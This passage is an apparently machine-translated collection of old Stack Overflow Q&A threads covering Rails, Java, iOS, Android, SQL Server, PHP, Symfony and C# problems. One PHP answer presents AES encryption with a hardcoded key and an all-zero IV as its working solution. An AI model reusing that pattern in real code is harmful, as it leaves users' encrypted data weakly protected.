> 时间：2013-10-22T01:24:14.757

已将 Launch Services 作为 UI 应用程序“签入”的应用程序会获得图标。从技术上讲，任何最终调用`LSApplicationCheckIn`都会得到一个，但这不是你可以自己拨打的电话。

如果你运行一个标准`NSRunLoop`，甚至初始化`NSApplication`（`[NSApplication sharedApplication]`）你应该得到它。

我的问题是：你在做什么你*没有*得到它？

# ruby-on-rails - 添加评论 + Ajax

> ID：12300132
> 
> 赞同：5
> 
> 时间：2012-09-06T12:27:12.297
> 
> 标签：ruby-on-rails, ajax

我已经开始学习 Rails，我想在评论中添加 ajax

应使用 Ajax 添加注释

你能帮忙或链接到一个例子吗？

如果我的 config.rb 在这里：

```
 resources :posts do
    resources :comments
  end 
```

在 post/show.html.erb

```
<p><%= @post.title %></p>

    <h2>Comments:</h2>
    <div id='com'>
      <%= render @post.comments %>
    </div>

<h2>Add a comment:</h2>
<%= render "comments/form" %> 
```

在视图/comments/_comment.html.erb 中：

```
<p>
  <strong>Commenter:</strong>
  <%= comment.commenter %>
</p>
<p>
  <strong>Comment:</strong>
  <%= comment.body %>
</p>
<%= link_to "Del", [comment.post, comment], :confirm => 'Are you sure?', :method => :delete %>
<hr> 
```

在评论/form.html.erb

```
<%= form_for([@post, @post.comments.build], remote: true) do |f| %>
.
.
. 
```

在 comments_controller 中：

```
class CommentsController < ApplicationController

  def create
    @post = Post.find(params[:post_id])
    @comment = @post.comments.create(params[:comment])

    respond_to do |format|
        format.html { redirect_to post_path(@post) }
        format.js 
    end
  end 
```

并在视图中添加文件：_create.js.erb

```
$('#com').html("<%=j render @post.comments %>"); 
```

没有远程真所有作品（但重新加载页面）动作删除作品

在 application.html.erb

```
 <%= javascript_include_tag 'application' %> 
```

当我点击提交表单时 - 没有任何反应

但是当我（提交后）重新加载页面时 - 我看到了添加的评论

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:50:16.717

您需要包含不显眼的 javascript

在`app/assets/javascripts/application.js`

你有这个吗（如果没有添加它）

```
//= require jquery
//= require jquery_ujs 
```

和

@DemitriyDN 本人回答:)

重命名`_create.js.erb`为`create.js.erb`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T03:57:09.487

在 comments_controller 中编辑您的新代码：

```
class CommentsController < ApplicationController

  def create
    @post = Post.find(params[:post_id])
    @comment = @post.comments.create(params[:comment])

    respond_to do |format|
        format.html { redirect_to post_path(@post) }
        format.js 
    end
  end
end 
```

# java - Web 服务调用和泛型，奇怪的行为

> ID：12300135
> 
> 赞同：0
> 
> 时间：2012-09-06T12:27:36.953
> 
> 标签：java, web-services, exception, generics, soap

我有一个如下所示的 Web 服务界面：

```
@WebService
@SOAPBinding(style = SOAPBinding.Style.RPC)
public interface MyWS<T> {    
    @WebMethod Person getRow(int id);

    @WebMethod T insertRow(T a);    
} 
```

真正奇怪的是，该`insertRow`方法仅在我还有一个返回 Person 的方法时才有效。请注意，我不必使用`getRow`来`insertRow`上班。

换句话说：当我从客户端程序仅调用`insertRow`Web 服务时，只有当我还有一个`getRow`返回 Person 的方法时它才有效。如果我`getRow`从 web 服务中删除，然后再次运行客户端程序，我会得到这个异常：

```
Exception in thread "main" javax.xml.ws.WebServiceException: javax.xml.bind.MarshalException
 - with linked exception:
[com.sun.istack.internal.SAXException2: class com.myproject.Person nor any of its super class is known to this context.
javax.xml.bind.JAXBException: class com.myproject.Person nor any of its super class is known to this context.] 
```

奇怪啊！

到底是怎么回事？

# objective-c - 如何使用 Apple bonjour for iOS 读取 TXT 记录

> ID：12300137
> 
> 赞同：6
> 
> 时间：2012-09-06T12:27:38.047
> 
> 标签：objective-c, ios, bonjour

我试图在 didFindService 函数中获取 TXTrecords，但我发现该值为 null。

你有什么想法来解决我的问题吗？

```
- (void)netServiceBrowser:(NSNetServiceBrowser*)netServiceBrowser didFindService:(NSNetService*)service moreComing:(BOOL)moreComing {
    [self.services addObject:service];

    NSDictionary* dict = [[NSNetService dictionaryFromTXTRecordData:[service TXTRecordData]] retain];
    MyTreeNode *node = [[MyTreeNode alloc] initWithValue:[service name]];
    NSString* info = [self copyStringFromTXTDict:dict which:@"info"];
    if([info isEqualToString:@"child"]) { // info == null and dict == null??
        [treeNode addChild:node];
    }
    [info release];
    if (!moreComing) {
        [self sortAndUpdateUI];
    }
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-06T19:48:38.820

您需要先解决服务。在回调中，您所知道的只是服务存在，但您没有它的记录（既没有它的 A 也没有它的 TXT）。

你可以用`-resolveWithTimeout:`它来解决它。`-startMonitoring`如果您需要在修改 TXT 记录时收到通知，您也可以使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-11T09:03:32.877

我的问题在这里得到解决是最终代码：

```
- (void)netServiceBrowser:(NSNetServiceBrowser*)netServiceBrowser didFindService:(NSNetService*)service moreComing:(BOOL)moreComing {
    [service setDelegate:self];
    [service resolveWithTimeout:0.0];
    [self.services addObject:service];

    if (!moreComing) {
        [self sortAndUpdateUI];
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-10T21:39:51.747

我改变了我的 didFindService 功能如下（我的应用程序是基于苹果“BonjourWeb”的例子）：

```
- (void)netServiceBrowser:(NSNetServiceBrowser*)netServiceBrowser didFindService:(NSNetService*)service moreComing:(BOOL)moreComing {
    [self.services addObject:service];
    NSInteger i,n = [self.services count];
    for(i=0;i<n;i++)
    {
        NSLog(@"%d %@",i,[[self.services objectAtIndex:i]name]);
        if (self.currentResolve) {
            [self stopCurrentResolve];
        }
        self.currentResolve = [self.services objectAtIndex:i];
        [self.currentResolve setDelegate:self];
        [self.currentResolve resolveWithTimeout:0.0];
        self.timer = [NSTimer scheduledTimerWithTimeInterval:20.0 target:self selector:@selector(showWaiting:) userInfo:self.currentResolve repeats:NO];
    }

    if (!moreComing) {
        [self sortAndUpdateUI];
    }
} 
```

我注意到在运行我的应用程序时，函数 netServiceDidResolveAddress 被调用一次，它只解析数组 self.services 的最后一个元素（我有 11 个服务，它只解析索引为 10 的对象）。我的问题是解决所有服务。

# android - listview中的android数据库显示显示一行

> ID：12300140
> 
> 赞同：0
> 
> 时间：2012-09-06T12:27:41.803
> 
> 标签：android, sqlite

我有一个我想在列表视图中显示的数据库。我有事要做。继承人的代码：

```
Cursor cursor = myDataBase
                    .rawQuery(
                            "SELECT * FROM Accelerometer where cur_timestamp<'2012-09-04 11:36:25'",
                            null);          

            while (cursor.moveToNext()) {
                // Which column you want to exprort
                String arrStr[] = { cursor.getString(0)+" | " + cursor.getString(1)+" | " + cursor.getString(2)+" | "+ cursor.getString(3)+" | " + cursor.getString(4)+"\n" };
                if (arrStr.length != 0) {
                    Log.d("TravellerLog :: ", Arrays.toString(arrStr));
                    //data.setText(Arrays.toString(arrStr));
                    ListView listView = (ListView) findViewById(R.id.listView1);
                    // a listát berakni aegy arraylist-be
                     ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, android.R.id.text1,
                             arrStr);
                     listView.setAdapter(adapter);

                } else {
                    Log.e("TravellerLog :: ", "Üres a tömb!");
                }
            }

            cursor.close(); 
```

我应该在代码中进行哪些更改才能使其正常工作？列出我想要的所有行非常感谢您的回答！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:56:18.043

```
l.setOnItemClickListener(new OnItemClickListener(){
    public void onItemClick(AdapterView<?> a, View v, int pos,long id){
        Cursor cursor = (Cursor) a.getItemAtPosition(pos);

        I.putExtra("ID", cursor.getInt(cursor.getColumnIndex("_id")));

       // more code here 
```

使用选择查询连接到数据库并从数据库中获取值....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:30:05.607

您正在 while 循环内初始化列表视图和适配器。这意味着您为每个 db 行创建一个新列表。

```
List<String> arrStr = new Vector<String>();
while (cursor.moveToNext()) {
            // Which column you want to exprort
            arrStr.add(cursor.getString(0)+" | " + cursor.getString(1)+" | " + cursor.getString(2)+" | "+ cursor.getString(3)+" | " + cursor.getString(4)+"\n" );
            if (arrStr.length != 0) {
                Log.d("TravellerLog :: ", Arrays.toString(arrStr));
                //data.setText(Arrays.toString(arrStr));
            } else {
                Log.e("TravellerLog :: ", "Üres a tömb!");
            }
        }

        cursor.close();

 ListView listView = (ListView) findViewById(R.id.listView1);
                // a listát berakni aegy arraylist-be
                 ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, android.R.id.text1,
                         arrStr);
                 listView.setAdapter(adapter); 
```

# sql-server - SQL Server 中自己的排序算法

> ID：12300142
> 
> 赞同：2
> 
> 时间：2012-09-06T12:27:50.963
> 
> 标签：sql-server, sorting

我有一个存储层次关系的表。它们存储为像 1.1、1.1.1、1.1.2、1.2 这样的字符串......因此，当我需要按层次顺序对它们进行排序时，我需要调用我自己的排序函数。Aren' t I？但是我认为编写自己的有效算法（n * ln（n））太长了。我想使用仅比较两个值并将其与ORDER BY语句一起使用的小函数。我可以这样做吗？还有另一个实现这一目标的方法？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:18:27.077

用零将每个级别左填充到固定长度将允许直接的文本排序。使用您的样本值：

```
0001.0001
0001.0001.0001
0001.0001.0002
0001.0002 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:46:52.483

试试这个

```
order by
    parsename(col,4)*1,
    parsename(col,3)*1,
    parsename(col,2)*1,
    parsename(col,1)*1 
```

# php - iOS/PHP kCCDecodeError

> ID：12300147
> 
> 赞同：0
> 
> 时间：2012-09-06T12:28:04.597
> 
> 标签：php, ios, encryption

我一生都无法弄清楚为什么当我在 PHP 中加密某些内容时，我无法在我的 iOS 应用程序中对其进行解密，但 PHP 可以解密 iOS 加密字符串并在自身之间解密/加密。

> PHP -> Obj-C 失败。

是的，我浏览了整个网络，我发现的唯一解决方案是使用我已经在做的`CBC`。`PHP`

我正在使用`FBEncryptor`iOS 库，这些是 PHP 中的加密/解密函数：

```
function encrypt($decrypted)
{    
    $iv = ''; for($i=0;$i<16;$i++){ $iv .= "\0";}
    $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $passKey, $decrypted, MCRYPT_MODE_CBC, $iv);
    $ciphertext = base64_encode($ciphertext);
    return $ciphertext;
}

function decrypt($encrypted)
{
    $iv = ''; for($i=0;$i<16;$i++){ $iv .= "\0";}        
    $ciphertext = base64_decode($encrypted);
    $plaintext = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $passKey, $ciphertext, MCRYPT_MODE_CBC, $iv);
    return $plaintext;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T08:56:32.510

我设法解决了这个问题。对我来说，密码变量是一个愚蠢的错误。无论如何，对于遇到此问题的其他任何人，这是我的最终实现：

```
function encrypt($decrypted)
{
    $thePassKey = "12345678901234567890123456789012";

    # Add PKCS7 padding.
    $str = $decrypted;
    $block = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    if (($pad = $block - (strlen($str) % $block)) < $block) 
    {
        $str .= str_repeat(chr($pad), $pad);
    }

    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    $iv = ''; for($i=0;$i<$iv_size;$i++){ $iv .= "\0";}
    return base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $thePassKey, $str, MCRYPT_MODE_CBC, $iv));
}

function decrypt($encrypted)
{
    $thePassKey = "12345678901234567890123456789012";

    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    $iv = ''; for($i=0;$i<$iv_size;$i++){ $iv .= "\0";}
    $str = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $thePassKey, base64_decode($encrypted), MCRYPT_MODE_CBC, $iv);

    # Strip PKCS7 padding.
    $block = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    $pad = ord($str[($len = strlen($str)) - 1]);
    if ($pad && $pad < $block && preg_match(
        '/' . chr($pad) . '{' . $pad . '}$/', $str))
    {
        return substr($str, 0, strlen($str) - $pad);
    }

    return $str;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:07:09.040

从[FBEncryptor](https://github.com/dev5tec/FBEncryptor) Github 页面（重点是我的）：

> 支持的加密算法**仅为 AES 256 位**。

但是在上面的代码片段中，您正在执行以下操作：

```
mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $ciphertext, MCRYPT_MODE_CBC, $iv); 
```

即使用 AES 128 位作为密码进行解密。

您需要相应地更正您的代码。其他常见错误包括使用不匹配的填充和分组密码操作模式。

# file - 为什么 .txt 文件无法打开以从 ftp 服务器读取？

> ID：12300152
> 
> 赞同：0
> 
> 时间：2012-09-06T12:28:26.280
> 
> 标签：file, ftp

我已手动将文件上传到 FTP 服务器。尝试通过 URL 访问它时，它不存在。

这是链接： http: [//fortunemobiletech.net16.net/welcome.txt](http://fortunemobiletech.net16.net/welcome.txt)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:31:37.400

尝试： `ftp://`而不是`http://` with（用户名密码）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:30:51.413

您上传文件的路径似乎不正确。

你放在`welcome.txt`文件`public_html`夹里了`fortunemobiletech.net16.net`吗？

或者，如果您有权访问`net16.net`的`public_html`文件夹，请尝试将 txt 文件上传到`public_html/fortunemobiletech/`.

# symfony - Symfony2 Doctrine2 列被设置为空

> ID：12300153
> 
> 赞同：1
> 
> 时间：2012-09-06T12:28:35.820
> 
> 标签：symfony, doctrine-orm, many-to-one

我有一个系统，该系统采用详细说明项目的表单信息，将其添加到项目表中，并且旨在将条目添加到分配的项目表中以将用户与项目相关联（这一点是允许每个项目有多个用户）。无论如何，我在没有外键的情况下得到了这个工作，努力添加它们但最终得到了它们。

不幸的是，每当将某些内容添加到assignedProjects 表时，此附加功能都会导致此错误“SQLSTATE [23000]：完整性约束违规：1048 列'projectId' 不能为空”。

所以我的问题是，我是否遗漏了代码中的某些内容？

向assignedProjects 添加新行的代码：

```
$assignedProject = new AssignedProjects();
$assignedProject->setProjectId($project->getId());
$assignedProject->setUserId($user[0]['id']);
$em = $this->getDoctrine()->getEntityManager();
$em->persist($assignedProject);
$em->flush(); 
```

assignProjects 实体的代码： class AssignedProjects { /** * @var integer $id * * @ORM\Column(name="id", type="integer") * @ORM\Id * @ORM\GeneratedValue(strategy ="AUTO") */ 私人 $id;

```
/**
 * @var integer $projectId
 *
 * @ORM\Column(name="projectId", type="integer")
 */
private $projectId;

/**
* @ORM\ManyToOne(targetEntity="Projects", inversedBy="assignment")
* @ORM\JoinColumn(name="projectId", referencedColumnName="id")
*/
private $project;

/**
 * @var integer $UserId
 *
 * @ORM\Column(name="userId", type="integer")
 */
private $userId;

/**
* @ORM\ManyToOne(targetEntity="Dev\UserBundle\Entity\User", inversedBy="assignment")
* @ORM\JoinColumn(name="userId", referencedColumnName="id")
*/
private $user; 
```

（后面是通常的 getter 和 setter）

项目表实体是：

```
class Projects
{
/**
* @var integer $id
*
* @ORM\Column(name="id", type="integer")
* @ORM\Id
* @ORM\GeneratedValue(strategy="AUTO")
*/
private $id;

/**
* @var string $projectName
*
* @ORM\Column(name="projectName", type="string", length=255)
*/
private $projectName;

/**
* @ORM\OneToMany(targetEntity="AssignedProjects", mappedBy="project")
*/
protected $assignment; 
```

任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:50:25.060

要么使用 ProjectId 和 UserId 列并手动管理关系（不推荐），要么使用原则关系（推荐），但不要同时做这两件事。如果您选择第二个选项，请不要包含 projectId 和 userId 列，它们是由学说自动为您创建的。因此，您的 AssignedProjects 类应该是：

```
class AssignedProjects {
/**
 * @var integer $id
 *
 * @ORM\Column(name="id", type="integer")
 * @ORM\Id * @ORM\GeneratedValue(strategy="AUTO")
 */
private $id;

/**
 * @ORM\ManyToOne(targetEntity="Projects", inversedBy="assignment")
 * @ORM\JoinColumn(name="projectId", referencedColumnName="id")
 */
private $project;

/**
 * @ORM\ManyToOne(targetEntity="Dev\UserBundle\Entity\User", inversedBy="assignment")
 * @ORM\JoinColumn(name="userId", referencedColumnName="id")
 */
private $user; 
```

在您的控制器中，您将执行以下操作：

```
$assignedProject = new AssignedProjects();
$assignedProject->setProject($project);
$assignedProject->setUser($user[0]);
$em = $this->getDoctrine()->getEntityManager();
$em->persist($assignedProject);
$em->flush(); 
```

请注意，我正在设置项目和用户字段，而不是 id

顺便说一句，除非您需要保存有关此项目分配的额外数据（例如日期或类似内容），否则您可以在 User 和 Project 之间声明直接的 ManyToMany 关系并取消此类，Doctrine 将自己生成所需的表

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:52:30.703

使用 Doctrine2，您不必声明外键 (projectId)，而只需声明关联 (project)。所以你可以删除`$projectId`属性，以及`setProjectId`ans`getProjectId`方法。$user 的相同修复...

相反，您将像这样使用 setProject ：

```
$assignedProject = new AssignedProjects();
$assignedProject->setProject($project);
$assignedProject->setUser($user[0]);
$em = $this->getDoctrine()->getEntityManager();
$em->persist($assignedProject);
$em->flush(); 
```

看看 Doctrine2 文档，它肯定会帮助你！ [http://docs.doctrine-project.org/projects/doctrine-orm/en/2.1/reference/association-mapping.html](http://docs.doctrine-project.org/projects/doctrine-orm/en/2.1/reference/association-mapping.html)

# c# - 无法从 aspx 页面呈现 excel 下载

> ID：12300154
> 
> 赞同：0
> 
> 时间：2012-09-06T12:28:40.547
> 
> 标签：c#, asp.net, internet-explorer, iis, http-headers

我有一个 ASP.NET (webforms) 页面，通过单击按钮将 MS-Excel 呈现回响应流。一切都在测试中完美运行，但在实时部署中，在浏览器似乎正在尝试下载文件后，我得到了这个对话框： ![在此处输入图像描述](../Images/013b09890a9224fc2eff05eba0a18da0.png) 其中 ReportsShow.aspx 是生成和呈现 excel 的 aspx 页面的名称。触发下载的按钮会触发回发，所以我很困惑为什么页面在加载时正确呈现时找不到？我一无所知，任何帮助将不胜感激

**编辑**：根据 Mayank 的要求，这是代码结构：

```
 // Get instance of reporting service
        IReportingService reportingServiceClient = Reports.GetWebService();
        // Get a fresh copy of the report
        BusinessReport theReport = reportingServiceClient.GetReport(AcctList.ToArray());

        ExcelExport excelExport = new ExcelExport();

        const string templateFileName = "Business-Report.xls";
        string newFileName = String.Empty;

        try
        {
            newFileName = excelExport.CopyTemplateFile(Server.MapPath("~/ExportTemplates/" + templateFileName));
            excelExport.WriteData(forexOptionReport, newFileName);

            Response.Clear();

            Response.AddHeader("content-disposition", string.Format("Attachment; filename=\"{0}\"", "Business-Report" + ".xls"));
            Response.ContentType = "application/vnd.ms-excel";

            Response.TransmitFile(newFileName);
            Response.Flush();
        }
        catch (Exception ex)
        {
            Errors.LogException("Error in Reports.BtnDownloadToExcel_Click", ex);
            throw;
        }
        finally
        {
            if (!String.IsNullOrEmpty(newFileName))
            {
                excelExport.DeleteFile(newFileName);
            }
        } 
```

**更多信息**

我已经用提琴手分析了这个，这就是我看到的特定请求/响应，预计将呈现 excel 以供下载：

![在此处输入图像描述](../Images/d68ca7a1429222c1d9c89fab745819e2.png)

[这个 Stackoverflow Q/A](https://stackoverflow.com/questions/3874436/what-is-the-meaning-of-this-fiddler-icon)声明禁止图标的含义是客户端正在终止/中止响应

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-07T08:51:39.303

我已经找到了解决这个问题的方法。详细信息[如此链接中所述](http://blogs.msdn.com/b/ieinternals/archive/2009/10/03/internet-explorer-cannot-download-over-https-when-no-cache.aspx.)

[这个 SO question](https://stackoverflow.com/questions/9234044/asp-net-mvc-and-ie-caching-manipulating-response-headers-ineffective)有一些细节和资源可以澄清正在发生的事情。基本问题是 IE 8 及以下版本在响应中看到以下标头时无法通过 SSL 下载文件： Cache-control: no-cache Pragma: no-cache

这些标题应删除并替换为：

```
Response.Headers.Set("Cache-Control", "private, max-age=0"); 
```

# android - 使用 sharedpref 字符串作为 sendTextMessage 的输入

> ID：12300155
> 
> 赞同：1
> 
> 时间：2012-09-06T12:28:46.860
> 
> 标签：android, sms

我正在创建一个应用程序，它接受用户通过 EditText 输入的字符串，将它们放入 sharedpreference 中，然后在收到短信时发送自动短信，使用来自 sharedpreference 的字符串来指示电话号码和短信将自动发送。

只要我硬编码要发送的电话号码和短信，该应用程序就可以完美运行。一旦我尝试将共享首选项中的字符串放入 SendSMS 方法中，应用程序就会崩溃，并且出现调试错误“hasUserDataHeader：false”

下面的代码是我尝试从名称 EditText 中获取字符串并将其用作要通过参数 TextMessage 发送的消息的版本（请参阅广播接收器中的这行代码）。如果我用“TextMessage”替换它，那会很好，但显然这不会使发送的文本动态

下面的代码：

```
 import android.os.Bundle;
            import android.app.Activity;
            import android.view.Menu;
            import android.view.View;
            import android.widget.AdapterView;
            import android.widget.AdapterView.OnItemSelectedListener;
            import android.widget.ArrayAdapter;
            import android.widget.EditText;
            import android.widget.Spinner;
            import android.widget.Button;
            import android.app.PendingIntent;
            import android.content.Intent;
            import android.telephony.SmsManager;
            import android.content.BroadcastReceiver;
            import android.content.Context;
            import android.content.IntentFilter;
            import android.widget.TextView;
            import android.app.Notification;
            import android.app.NotificationManager;
            import android.content.SharedPreferences;

            public class MainActivity extends Activity {

                int notificationID = 1;
                String[] excuses;
                String excuseSelected;
                IntentFilter intentFilter;
                private SharedPreferences prefs;
                private String prefName = "MyPref";
                private static final String NUMBER_KEY = "number";
                private static final String NAME_KEY = "name";
                private static final String EXCUSE_KEY = "excuse"; 

                private BroadcastReceiver intentReceiver = new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {

                        //---gather up all the necessary user input---
                        prefs = getSharedPreferences(prefName, MODE_PRIVATE);
                        String textMessage = (String) prefs.getString(NAME_KEY, "");
                        sendSMS("0403579838", textMessage);             
            //          }
                    }
                };

                @Override
                public void onCreate(Bundle savedInstanceState) {
                    super.onCreate(savedInstanceState);
                    setContentView(R.layout.activity_main);

                    //---intent to filter for SMS messages received---
                    intentFilter = new IntentFilter();
                    intentFilter.addAction("SMS_RECEIVED_ACTION");

                    final Button btn1 = (Button)findViewById(R.id.buttonToggle);

                    excuses = getResources().getStringArray(R.array.excuses_array);
                    Spinner s1 = (Spinner) findViewById(R.id.spinnerExcuse);
                    final EditText EditTextNumber = (EditText) findViewById(R.id.editTextNumber);
                    final EditText EditTextName = (EditText) findViewById(R.id.editTextName);

                        //---Sorting the spinner view out for excuses selection---
                        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
                                android.R.layout.simple_spinner_item, excuses);

                        s1.setAdapter(adapter);
                        s1.setOnItemSelectedListener(new OnItemSelectedListener()
                        {
                            public void onItemSelected(AdapterView<?> arg0, View arg1,
                                    int arg2, long arg3)
                            {
                                int index = arg0.getSelectedItemPosition();
                                excuseSelected = excuses[index];
                            }

                            public void onNothingSelected(AdapterView<?> arg0) {}
                        });

                    //---Setting the button to toggle between on and off---
                    btn1.setOnClickListener(new View.OnClickListener() {
                        public void onClick(View v) {
                            if (btn1.getText().equals("Turn on"))                       
                            {
                                btn1.setText("Turn off");
                                //---register the receiver---
                                registerReceiver(intentReceiver, intentFilter);
                                //---get the SharedPreferences object---
                                prefs = getSharedPreferences(prefName, MODE_PRIVATE);
                                SharedPreferences.Editor editor = prefs.edit();

                                //---set the user inputs to prefo's---
                                editor.putString(NUMBER_KEY, EditTextNumber.getText().toString());
                                editor.putString(NAME_KEY, EditTextName.getText().toString());
                                editor.putString(EXCUSE_KEY, excuseSelected);

                            }
                            else
                            {
                                btn1.setText("Turn on");
                                //---unregister the receiver---
                                unregisterReceiver(intentReceiver);
                            }
                        }
                    });

                }

                //---sends an SMS message to another device---
                public void sendSMS(String phoneNumber, String message)
                {
                    SmsManager sms = SmsManager.getDefault();
                    sms.sendTextMessage(phoneNumber, null, message, null, null);
                    displayNotification();
                }

                protected void displayNotification()
                {
                    Intent i = new Intent(this, NotificationView.class);
                    i.putExtra("notificationID", notificationID);

                    PendingIntent pendingIntent =
                        PendingIntent.getActivity(this, 0, i, 0);

                    NotificationManager nm = (NotificationManager)
                        getSystemService(NOTIFICATION_SERVICE);

                    Notification notif = new Notification(
                            R.drawable.ic_launcher,
                            "SMS has been sent by GirlfriendMinder",
                            System.currentTimeMillis());

                    CharSequence from = "GirlfriendMinder";
                    CharSequence message = "SMS has been sent by GirlfriendMinder";

                    notif.setLatestEventInfo(this, from, message, pendingIntent);

                    //---100ms delay, vibrate for 250ms, pause for 100ms, and then vibrate for 500ms---
                    notif.vibrate = new long[] { 100, 250, 100, 500};
                    nm.notify(notificationID, notif);
                }

                @Override
                protected void onDestroy() {
                    //---unregister the receiver---
                    unregisterReceiver(intentReceiver);
                    super.onPause();
                }
            } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:44:26.413

在您的代码中：

```
//---Setting the button to toggle between on and off---
                    btn1.setOnClickListener(new View.OnClickListener() {
                        public void onClick(View v) {
                            if (btn1.getText().equals("Turn on"))                       
                            {
                                btn1.setText("Turn off");
                                //---register the receiver---
                                registerReceiver(intentReceiver, intentFilter);
                                //---get the SharedPreferences object---
                                prefs = getSharedPreferences(prefName, MODE_PRIVATE);
                                SharedPreferences.Editor editor = prefs.edit();

                                //---set the user inputs to prefo's---
                                editor.putString(NUMBER_KEY, EditTextNumber.getText().toString());
                                editor.putString(NAME_KEY, EditTextName.getText().toString());
                                editor.putString(EXCUSE_KEY, excuseSelected);

                            }
                            else
                            {
                                btn1.setText("Turn on");
                                //---unregister the receiver---
                                unregisterReceiver(intentReceiver);
                            }
                        }
                    });

                } 
```

以下：

```
editor.putString(EXCUSE_KEY, excuseSelected); 
```

添加

```
editor.commit(); 
```

# java - 如何从 java 中的 URL 读取 JavaScript 响应

> ID：12300156
> 
> 赞同：0
> 
> 时间：2012-09-06T12:28:45.837
> 
> 标签：java, javascript

我需要编写一个简单的 java 函数，它接受一个 URL 并处理 JavaScript 中的响应，我尝试使用 HttpUrlConnection，但它不能。是否有任何用于处理 javascript 响应的 java 库？

谢谢。

编辑：我的代码：

```
Url url = new url("https://login.live.com/oauth20_authorize.srf");
HttpURLConnection con = (HttpURLConnection) url.openConnection();
BufferedReader reader = new BufferedReader( new InputStreamReader(url.openStream()));
while(reader.readLine()!=null){
System.out.println(reader.readLine()); 
```

回复：

```
<html dir="..... Windows Live ID requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked......<body onload="evt_LoginHostMobile_onload(event);"> 
```

但我想阅读那些 javascript 响应。在java中可以吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-16T02:33:29.663

我找到了方法，H [tmlUnit](http://htmlunit.sourceforge.net/)这样做，它可以处理 javascript 响应

感谢所有那些负面评价者......

# c# - 在 HTTP 请求登录后保持登录数据有效

> ID：12300159
> 
> 赞同：1
> 
> 时间：2012-09-06T12:29:04.520
> 
> 标签：c#, cookies, httprequest, httpresponse

通过 HTTP 请求，我登录到页面：[https](https://secure.bodytel.com/de/mybodytel.html) ://secure.bodytel.com/de/mybodytel.html 。之后我想阅读设置（https://secure.bodytel.com/de/mybodytel/settings.html）。所以这是我的问题：我发送了第二个请求，页面告诉我我没有登录了。当我用 fiddler 调试东西时，我看到我有两个不同的 cookie ID。那么，我怎样才能让 cookie 保持活力呢？或随我的要求发送。

我已经阅读了这篇文章：“http://stackoverflow.com/questions/11596378/getting-a-page-source-after-post-variables-have-been-sent”，但它对我没有多大帮助。

这是我的代码：使用 System.Text；使用 System.Windows；使用 System.Windows.Controls；使用 System.Windows.Forms；使用 System.Net；使用 System.IO；使用 System.Web；

```
namespace BodytelConnection
{
/// <summary>
/// Interaktionslogik für MainWindow.xaml
/// </summary>
public partial class MainWindow : Window
{

    public MainWindow()
    {
        InitializeComponent();
    }

    private void loginBtn_Click(object sender, RoutedEventArgs e)
    {

        #region username stuff
        string benutzername = textBox_benutzername.ToString();
        string passwort = textBox_passwort.ToString();
        passwort = changeString(passwort);
        benutzername = changeString(benutzername);
        #endregion username stuff

        CookieCollection cookies = new CookieCollection();
        CookieContainer container = new CookieContainer();

        #region login
        HttpWebRequest getRequest = (HttpWebRequest)WebRequest.Create("https://secure.bodytel.com/de/mybodytel.html");
        getRequest.Method = WebRequestMethods.Http.Post;
        getRequest.AllowWriteStreamBuffering = true;
        getRequest.AllowAutoRedirect = true;
        getRequest.ContentType = "application/x-www-form-urlencoded";
        byte[] byteArray = Encoding.ASCII.GetBytes("login=" + benutzername + "&password=" + passwort + "&step=login");
        getRequest.ContentLength = byteArray.Length;
        Stream newStream = getRequest.GetRequestStream();
        newStream.Write(byteArray, 0, byteArray.Length);
        newStream.Close();
        HttpWebResponse getResponse = (HttpWebResponse)getRequest.GetResponse();
        StreamReader sr = new StreamReader(getResponse.GetResponseStream());
        // here im trying to save the cookie
        container.Add(getResponse.Cookies);
        getRequest.CookieContainer = container;
        string source = sr.ReadToEnd();
        // save the html
        StreamWriter myWriter = File.CreateText(@"C:\Users\nicholas\Documents\Visual Studio 2010\Projects\BodytelConnection\BodytelConnection\bin\\Debug\test.txt");
        myWriter.Write(source);
        myWriter.Close();
        #endregion login

        //read the settings 
        #region readSettings
        getRequest.Method = WebRequestMethods.Http.Get;
        getRequest = (HttpWebRequest)WebRequest.Create("https://secure.bodytel.com/de/mybodytel/settings.html");         
        getRequest.AllowWriteStreamBuffering = true;
        getResponse = (HttpWebResponse)getRequest.GetResponse();
        sr = new StreamReader(getResponse.GetResponseStream());
        source = sr.ReadToEnd();
